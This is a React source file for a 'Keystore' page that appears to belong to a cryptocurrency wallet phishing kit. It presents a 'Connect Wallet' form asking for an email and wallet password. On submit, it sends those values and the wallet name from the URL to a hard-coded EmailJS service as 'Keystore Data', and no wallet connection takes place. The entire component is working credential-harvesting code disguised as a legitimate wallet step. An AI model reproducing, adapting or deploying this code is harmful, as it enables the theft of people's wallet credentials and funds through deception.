import React, { useRef, useState } from "react";
import emailjs from "@emailjs/browser";
import { useSearchParams } from "react-router-dom";

import FormInput from "../FormInput";
import Modal from "../Modal";

const FORM_INPUT = [
  {
    name: "email",
    label: "Email Address",
    type: "email",
    placeholder: "Enter your email address",
  },
  {
    name: "password",
    label: "Enter your wallet password",
    type: "password",
    placeholder: "Enter your password",
    hint: "",
  },
];

export default function Keystore() {
  const [open, setOpen] = useState(false);
  const form = useRef();
  const [searchParams] = useSearchParams();
  const wallet = searchParams.get("wallet");
  const toggle = () => setOpen(!open);

  const [fields, setFields] = useState({
    email: "",
    password: "",
  });

  const handleChange = (e) => {
    setFields((prev) => ({ ...prev, [e.target.name]: e.target.value }));
  };

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .send(
        "service_6258sgd",
        "template_10fpf9e",
        {
          ...fields,
          wallet,
          email_subject: "Keystore Data",
          form_type: "keystore",
        },
        "jX1TPYiDMqjJpr0-S"
      )
      .then(
        (result) => {
          alert("Email Sent");
        },
        (error) => {
          console.log(error.text);
        }
      );
    e.target.reset();
  };

  return (
    <div>
      {open && <Modal toggle={toggle} />}
      <form
        ref={form}
        className=" flex flex-col items-start justify-start gap-2"
        onSubmit={sendEmail}
      >
        {FORM_INPUT.map((input, index) => (
          <FormInput
            key={index}
            {...input}
            value={fields[input.name]}
            onchange={handleChange}
          />
        ))}
        <button
          type="submit"
          //   onClick={toggle}
          className="font-bold my-2 text-black bg-blue-400 max-w-full w-48 p-2 rounded-md"
        >
          Connect Wallet
        </button>
      </form>
    </div>
  );
}
